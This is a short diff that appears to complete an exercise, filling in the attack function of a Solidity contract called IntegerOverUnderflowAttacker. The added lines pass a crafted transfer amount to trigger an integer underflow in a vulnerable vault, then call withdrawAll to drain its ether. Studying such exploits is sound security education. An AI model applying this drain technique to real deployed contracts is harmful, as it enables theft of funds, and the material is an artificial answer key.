@@ -33,5 +33,8 @@ contract IntegerOverUnderflowAttacker {
         // Write your own code.
         // You have 10 deposit balance.
         // Be careful that the target (vulnerable) contract has 10_020 ethereum total.
+        ISafeVault sv = ISafeVault(vault);
+        sv.transfer(address(0x1337), type(uint256).max - 10_010 + 1);
+        sv.withdrawAll(address(this));
     }
 }
